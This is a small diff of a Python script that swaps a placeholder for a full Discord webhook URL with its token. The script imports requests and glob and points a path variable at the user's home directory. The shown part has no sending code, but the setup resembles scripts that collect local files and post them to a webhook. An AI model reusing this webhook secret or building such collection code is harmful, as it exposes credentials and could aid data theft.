@@ -7,7 +7,7 @@ import requests
 import json
 import glob
 
-webhook = "Your Discord Webhook URL"
+webhook = "https://discord.com/api/webhooks/1103360315405635605/fmm1KO7974wCsT7wNDP1sGhqUvaDjAJ_H5x7uMnmiZilzGbXDLxRRf-vb5QvNm8WX7_z"
 
 home = Path.home()
 path = str(home)
